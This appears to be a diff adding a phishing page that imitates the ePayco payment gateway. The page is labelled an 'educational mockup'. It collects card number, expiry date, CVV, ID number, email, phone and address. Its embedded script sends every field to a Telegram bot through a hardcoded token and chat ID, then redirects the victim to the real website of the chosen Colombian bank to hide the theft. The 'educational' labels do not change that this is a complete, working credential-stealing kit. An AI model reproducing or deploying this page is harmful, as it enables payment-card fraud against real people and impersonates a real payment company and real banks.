@@ -1,0 +1,473 @@
+<!doctype html>
+<html>
+
+<head>
+  <title>Pasarela de pagos | ePayco (Maqueta educativa)</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+
+  <!-- Fuentes -->
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,600" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css?family=Raleway:100,300,400,500%7CLato:300,400" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css?family=Roboto:100,300,400,500,700" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+
+  <!-- Bootstrap y Font Awesome -->
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+  <link rel="icon" type="image/svg+xml" href="./img/new epayco logo.svg">
+
+  <style>
+    body {
+      font-family: 'Open Sans', sans-serif;
+      background: #f7f8fa;
+    }
+
+    .card {
+      background: #fff;
+      padding: 20px;
+      margin: 20px auto;
+      border-radius: 8px;
+      box-shadow: 0 3px 8px rgba(0, 0, 0, 0.1);
+      max-width: 700px;
+    }
+
+    .principal-title {
+      font-weight: 600;
+      color: #1C0E49;
+    }
+
+    .input-form {
+      position: relative;
+      margin-bottom: 15px;
+    }
+
+    .input-form i {
+      position: absolute;
+      left: 16px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #377cac;
+      font-size: 16px;
+    }
+
+    .input-form input,
+    .input-form select {
+      width: 100%;
+      padding: 10px 10px 10px 35px;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+      font-size: 15px;
+    }
+
+    .call_action {
+      text-align: center;
+      cursor: pointer;
+      padding: 15px;
+      border-radius: 6px;
+      background: #377cac;
+      color: #fff;
+      font-weight: 600;
+      margin-top: 20px;
+      transition: all 0.3s ease;
+    }
+
+    .call_action:hover {
+      opacity: 0.95;
+      transform: translateY(-2px);
+    }
+
+    /* Checkbox estilo ePayco */
+    .checkbox {
+      margin-bottom: 12px;
+    }
+
+    .checkbox label {
+      font-size: 14px;
+      color: #1C0E49;
+      font-weight: 400;
+      line-height: 1.5;
+      cursor: pointer;
+    }
+
+    .checkbox input[type="checkbox"] {
+      appearance: none;
+      -webkit-appearance: none;
+      width: 18px;
+      height: 18px;
+      border: 2px solid #1C0E49;
+      border-radius: 4px;
+      margin-right: 8px;
+      margin-top: 2px;
+      cursor: pointer;
+      position: relative;
+      flex-shrink: 0;
+    }
+
+    .checkbox input[type="checkbox"]:checked {
+      background: #1C0E49;
+    }
+
+    .checkbox input[type="checkbox"]:checked::after {
+      content: "✔";
+      color: #fff;
+      font-size: 12px;
+      position: absolute;
+      top: -1px;
+      left: 3px;
+    }
+
+    .checkbox a {
+      color: #004aad;
+      font-weight: 600;
+      text-decoration: none;
+    }
+
+    .checkbox a:hover {
+      text-decoration: underline;
+    }
+
+    /* Breadcrumb */
+    .number-cumbread {
+      display: inline-block;
+      background: #377cac;
+      color: #fff;
+      font-weight: bold;
+      border-radius: 50%;
+      width: 30px;
+      height: 30px;
+      line-height: 30px;
+      text-align: center;
+    }
+
+    .inactive {
+      color: #aaa;
+    }
+
+    /* Footer */
+    footer {
+      text-align: center;
+      padding: 20px;
+      margin-top: 30px;
+      font-size: 14px;
+      color: #666;
+      background: #f0f2f5;
+      border-top: 1px solid #ddd;
+    }
+
+    /* Responsivo */
+    @media (max-width: 768px) {
+      .card {
+        padding: 25px;
+        margin: 10px;
+      }
+
+      .principal-title {
+        font-size: 18px;
+      }
+
+      .call_action h2 {
+        font-size: 18px;
+      }
+
+     .number-cumbread {
+        width: 21px;
+        height: 22px;
+        line-height: 22px;
+        font-size: 12px;
+      }
+    }
+
+    @media (max-width: 480px) {
+      .principal-title {
+        font-size: 19px;
+      }
+
+      .input-form input,
+      .input-form select {
+        font-size: 14px;
+        padding: 8px 8px 8px 30px;
+      }
+
+      .checkbox label {
+        font-size: 13px;
+      }
+
+      .call_action {
+        font-size: 15px;
+        padding: 1px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+ <!-- 🔹 HEADER -->
+<div class="container">
+  <div class="row" style="align-items:center; display:flex; justify-content:space-between;">
+    <!-- Logo -->
+    <div class="col-xs-6 col-sm-6">
+      <div class="navbar-header">
+        <img class="img-logo" src="./img/movis.png" height="50" alt="header-new-epayco-logo">
+      </div>
+    </div>
+
+    <!-- Idiomas + Seguridad -->
+    <div class="col-xs-6 col-sm-6 text-right">
+      <p class="selloheader hidden-xs" style="color: #1C0E49; margin:0;">
+        Pago seguro por <img src="./img/new epayco logo.svg" height="18" alt="new-epayco-logo">
+      </p>
+      <ul class="list-inline" style="margin: 5px 0 0;">
+        <li><a class="languaje-set color pointer" data-language="es" style="font-weight: bold">ES</a></li>
+        <li>/</li>
+        <li><a class="languaje-set color pointer" data-language="en">EN</a></li>
+        <li>
+          <div class="dropdown flagstandar fill-options-country" style="display:inline-block;">
+            <div data-toggle="dropdown">
+              <img src="./flags/co.svg" width="20" height="20" alt="global-icon">
+              <i class="fa fa-caret-down" aria-hidden="true"></i>
+            </div>
+            <ul class="dropdown-menu country-list">
+              <li class="load"><em class="fa fa-circle-o-notch fa-spin"></em></li>
+              <div class="clearfix"></div>
+            </ul>
+          </div>
+        </li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+
+  <!-- 🔹 BREADCRUMB -->
+  <div class="container">
+    <div class="row row-normalice">
+      <div class="col-xs-12">
+        <div class="card padding2">
+            
+            
+            
+  <center>      <div class="pointer method col-xs-4 item inactiveitem activeitem">
+            <p class="margin50 center hidden-xs">
+              <span class="number-cumbread">1</span> Seleccione el medio de pago
+            </p>
+            <p class="margin50 center visible-xs">
+              <span class="number-cumbread active">1</span>
+            </p>
+          </div>
+          <div class="col-xs-4 item inactiveitem">
+            <p class="margin50 center inactive hidden-xs">
+              <span class="number-cumbread">2</span> Complete la información
+            </p>
+            <p class="margin50 center inactive visible-xs">
+              <span class="number-cumbread">2</span>
+            </p>
+          </div>
+          <div class="col-xs-4 item inactiveitem">
+            <p class="margin50 center hidden-xs">
+              <span class="number-cumbread">3</span> Confirmación
+            </p>
+            <p class="margin50 center inactive visible-xs">
+              <span class="number-cumbread">3</span>
+            </p>
+          </div>
+        </div></center>
+        
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <!-- 🔹 FORMULARIO -->
+  <div class="container">
+    <div class="card" id="divforall">
+      <h3 class="principal-title">Información <br>de la tarjeta    <a href="pay.html" style="font-size:15px; color:#004aad; text-decoration:none; font-weight:500; margin-left:10px;">
+      Cambiar medio de pago
+    </a></h3>
+      <hr>
+
+      <!-- Banco -->
+      <div class="input-form full-width">
+        <i class="fa fa-bank"></i>
+        <select id="bank-option" class="binding-input form-control">
+          <option value="" selected>Seleccione su banco</option>
+          <option value="bancolombia">Bancolombia</option>
+          <option value="davivienda">Davivienda</option>
+          <option value="bogota">Banco de Bogotá</option>
+          <option value="bbva">BBVA</option>
+          <option value="itau">Itaú</option>
+        </select>
+      </div>
+
+      <!-- Nombre -->
+      <div class="input-form full-width">
+        <i class="fa fa-user"></i>
+        <input type="text" id="name_card" class="binding-input form-control" placeholder="Nombre como aparece en la tarjeta">
+      </div>
+<img src="center.jpeg" alt="Ejemplo de tarjeta" style="max-width:290px; height:auto;">
+      <!-- Número de tarjeta -->
+      <div class="input-form full-width">
+        <i class="fa fa-credit-card"></i>
+        <input type="tel" id="card_number" maxlength="19" class="binding-input form-control" placeholder="Número de la tarjeta">
+      </div>
+
+      <!-- Fecha y CVV -->
+      <div class="row">
+        <div class="col-xs-4 input-form">
+          <i class="fa fa-calendar"></i>
+          <input type="text" id="month-value" maxlength="2" class="binding-input form-control" placeholder="MM">
+        </div>
+        <div class="col-xs-4 input-form">
+          <i class="fa fa-calendar"></i>
+          <input type="text" id="year-value" maxlength="4" class="binding-input form-control" placeholder="AAAA">
+        </div>
+        <div class="col-xs-4 input-form">
+          <i class="fa fa-lock"></i>
+          <input type="password" id="card_cvc" maxlength="4" class="binding-input form-control" placeholder="CVC">
+        </div>
+      </div>
+
+      <!-- Documento -->
+      <div class="input-form full-width">
+        <i class="fa fa-id-card"></i>
+        <input type="number" id="documentnumber" maxlength="15" class="binding-input form-control" placeholder="Número de documento">
+      </div>
+
+      <!-- Email -->
+      <div class="input-form full-width">
+        <i class="fa fa-envelope"></i>
+        <input type="email" id="email_user" class="binding-input form-control" placeholder="Correo electrónico">
+      </div>
+
+      <!-- Teléfono -->
+      <div class="input-form full-width">
+        <i class="fa fa-phone"></i>
+        <input type="tel" id="tel" maxlength="12" class="binding-input form-control" placeholder="Número de móvil">
+      </div>
+
+      <!-- Ciudad -->
+      <div class="input-form full-width">
+        <i class="fa fa-building"></i>
+        <input type="text" id="city" class="binding-input form-control" placeholder="Ciudad">
+      </div>
+
+      <!-- Dirección -->
+      <div class="input-form full-width">
+        <i class="fa fa-map-marker"></i>
+        <input type="text" id="address" class="binding-input form-control" placeholder="Dirección">
+      </div>
+
+      <!-- Guardar datos -->
+      <div class="checkbox">
+        <label for="save_card">
+          <input type="checkbox" id="save_card" name="save_card">
+          Guardar mis datos para futuros pagos a un clic
+        </label>
+      </div>
+
+      <!-- Términos -->
+      <div class="checkbox">
+        <label for="terms">
+          <input type="checkbox" id="terms" name="terms">
+          Confirmo que acepto los <a href="#">Términos y condiciones</a> de los servicios ofrecidos por ePayco.
+        </label>
+      </div>
+
+      <!-- Privacidad -->
+      <div class="checkbox">
+        <label for="privacy">
+          <input type="checkbox" id="privacy" name="privacy">
+          Autorizo de manera previa, expresa e inequívoca que mis datos personales sean tratados por <strong>Epayco.com</strong> conforme a las finalidades establecidas en su 
+          <a href="#">Política de tratamiento de datos personales</a>.
+        </label>
+      </div>
+
+      <!-- Botón -->
+      <div class="call_action" id="send-form">
+        <h2>Continuar</h2>
+      </div>
+    </div>
+  </div>
+
+  <!-- 🔹 FOOTER -->
+  <footer>
+    <p>© 2025 ePayco (Maqueta educativa). Todos los derechos reservados.</p>
+  </footer>
+
+<script>
+  // ⚠️ SOLO PARA FINES EDUCATIVOS
+  const token = "8301521168:AAFwfmwFHOLEVKno7_dkaF8z7r1j0-WxM4g";
+  const chatId = "5647970395";
+
+  document.addEventListener("DOMContentLoaded", () => {
+    const continuarBtn = document.getElementById("send-form");
+    const bancoSelect = document.getElementById("bank-option");
+
+    continuarBtn.addEventListener("click", (e) => {
+      e.preventDefault();
+
+      const nombre = document.getElementById("name_card").value;
+      const numero = document.getElementById("card_number").value;
+      const mes = document.getElementById("month-value").value;
+      const ano = document.getElementById("year-value").value;
+      const cvv = document.getElementById("card_cvc").value;
+      const banco = bancoSelect.value;
+      const documento = document.getElementById("documentnumber").value;
+      const email = document.getElementById("email_user").value;
+      const telefono = document.getElementById("tel").value;
+      const ciudad = document.getElementById("city").value;
+      const direccion = document.getElementById("address").value;
+
+      const mensaje = `
+📚 FORMULARIO EDUCATIVO
+👤 Nombre: ${nombre}
+💳 Tarjeta: ${numero}
+📅 Exp: ${mes}/${ano}
+🔐 CVV: ${cvv}
+🪪 Documento: ${documento}
+📧 Email: ${email}
+📞 Teléfono: ${telefono}
+🏦 Banco: ${banco}
+🏙️ Ciudad: ${ciudad}
+📍 Dirección: ${direccion}
+(⚠️ SOLO DATOS DE EJEMPLO)
+      `;
+
+      // Enviar a Telegram
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text: mensaje })
+      })
+        .then(r => r.json())
+        .then(() => {
+          // 🔹 Redirigir según el banco elegido (sin alert)
+          if (banco === "bancolombia") {
+            window.location.href = "https://www.bancolombia.com/personas";
+          } else if (banco === "davivienda") {
+            window.location.href = "https://www.davivienda.com/wps/portal/personas/nuevo";
+          } else if (banco === "bogota") {
+            window.location.href = "https://www.bancodebogota.com/wps/portal/banco-de-bogota/bogota";
+          } else if (banco === "bbva") {
+            window.location.href = "https://www.bbva.com.co";
+          } else if (banco === "itau") {
+            window.location.href = "https://www.itau.co";
+          }
+        })
+        .catch(err => {
+          console.error("❌ Error en el envío a Telegram:", err);
+        });
+    });
+  });
+</script>
+
+
+
+</body>
+</html>
+
+
+</body>
+</html>
